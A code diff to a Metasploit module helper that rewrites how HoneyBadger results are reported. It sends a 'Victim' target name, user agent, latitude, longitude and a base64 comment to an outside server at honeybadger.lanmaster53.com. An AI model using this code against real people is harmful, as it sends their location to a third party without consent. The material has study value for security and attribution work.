@@ -4,14 +4,19 @@ module Msf
 
         require 'net/https'
         require 'net/http'
+        require 'rex/proto/http/client'
 
+        
     def initialize(info = {})
 		super
 		
 		register_options(
 			[
+                         
+            # badger server honeybadger.lanmaster53.com
+            # badger uri    uri
 			OptString.new('BADGER_TGT',   [ true, "Badger Target", "Victim" ]),
-			OptString.new('BADGER_URI',   [ true, "Bager Reporting Page", "http://honeybadger.lanmaster53.com/service.php?"]),
+			OptString.new('BADGER_URI',   [ true, "Bager Reporting Page", "http://honeybadger.lanmaster53.com/service.php"]),
 			], self.class
 			)
 	end
@@ -49,27 +54,40 @@ module Msf
 			@acc
 		end
 	end
-
-	def report_cresults(pos,agent,comment)
-		reporting_uri = "#{datastore['BADGER_URI']}target=#{datastore['BADGER_TGT']}&agent=#{agent}&comment=#{comment}"
-		if (pos.acc)
-			reporting_uri << "&lat=#{pos.lat}&lng=#{pos.lon}&acc=#{pos.acc}"
-		end
-		print_status("Badger report sent to: #{datastore['BADGER_URI']}")
-		uri = URI.parse(reporting_uri)
-		response = Net::HTTP.get_response(uri)
-	end
-
-	def report_results(pos,agent)
-		reporting_uri = "#{datastore['BADGER_URI']}target=#{datastore['BADGER_TGT']}&agent=#{agent}"
-		if (pos.acc)
-			reporting_uri << "&lat=#{pos.lat}&lng=#{pos.lon}&acc=#{pos.acc}"
-		end
-		print_status("Badger report sent to: #{datastore['BADGER_URI']}")
-		uri = URI.parse(reporting_uri)
-		response = Net::HTTP.get_response(uri)
+    
+    def return_uri
+        uri = URI("#{datastore['BADGER_URI']}")
+        return uri
+    end
         
+    def report_results(pos,agent,comment=nil)
+        
+        uri = URI("#{datastore['BADGER_URI']}")
+        port = uri.port
+        host = uri.host
+        path = uri.path
+        ssl = false
+        if uri.scheme == "https"
+            ssl = true
+        end
+        c = Rex::Proto::Http::Client.new(host,port,{},ssl)
+        path << "?target=#{datastore['BADGER_TGT']}&agent=#{agent}"
+        if (pos.acc)
+            path << "&lat=#{pos.lat}&lng=#{pos.lon}&acc=#{pos.acc}"
+        end
+        if (comment!=nil)
+            b64_comment = Rex::Text.encode_base64(comment)
+            path << "&comment=#{b64_comment}"
+        end
+        r = c.request_raw('uri'=>path)
+        resp=c.send_recv(r)
+        if resp.code == 200
+            print_status("Badger report sent to: #{datastore['BADGER_URI']}")
+        else
+            print_status("Badger report failed to: #{datastore['BADGER_URI']}")
+        end
+    end
 
-		end
+        
 	end
 end
